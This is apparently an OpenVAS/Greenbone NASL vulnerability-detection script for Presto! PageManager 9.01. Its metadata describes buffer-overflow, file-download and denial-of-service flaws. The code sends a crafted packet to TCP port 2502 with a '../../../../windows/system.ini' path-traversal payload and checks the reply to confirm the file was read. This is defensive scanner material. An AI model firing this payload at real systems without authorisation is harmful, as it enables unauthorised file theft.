# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802620");
  script_version("2023-07-25T05:05:58+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-25 05:05:58 +0000 (Tue, 25 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-03-15 15:15:15 +0530 (Thu, 15 Mar 2012)");
  script_name("Presto! PageManager Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("General");
  script_dependencies("find_service.nasl", "os_detection.nasl");
  script_require_ports(2502);
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48380/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52503");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18600/");
  script_xref(name:"URL", value:"http://aluigi.org/adv/pagemanager_1-adv.txt");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to download
  arbitrary files, execute arbitrary code in the context of the application or
  cause denial-of-service conditions.");
  script_tag(name:"affected", value:"Presto! PageManager version 9.01 and prior");
  script_tag(name:"insight", value:"- A boundary error in the Network Group Service when processing certain
   network requests can be exploited to cause a heap-based buffer overflow.

  - An input validation error in the Network Group Service when processing
   certain network requests can be exploited to download arbitrary files via
   a specially crafted packet sent to TCP port 2502.

  - An error in the Network Group Service when processing certain network
   requests can be exploited to cause an unhandled exception and terminate
   the service.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"Presto! PageManager is prone to multiple vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("host_details.inc");

## Network Group Service Port
port = 2502;

if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

req = raw_string(0x00, 0x00, 0x01, 0x00, 0x15, 0x00, 0x00, 0x00,
                 0x6d, 0x79, 0x62, 0x6c, 0x61, 0x68, 0x00, 0x66,
                 0x69, 0x6c, 0x65, 0x00, 0x01, 0x00, 0x00, 0x00,
                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02,
                 0x00, 0x00, 0x01, 0x00, 0x00) +
                 "../../../../windows/system.ini" +
                 crap(data:raw_string(0x00), length: 228) +
                 raw_string(0x20, 0x00, 0x00, 0x00, 0x00, 0x00);

## Send attack request and receive the response
send(socket:soc, data:req);
res = recv(socket:soc, length:1024);
close(soc);

if(res && "[drivers]" >< res){
  security_message(port);
}
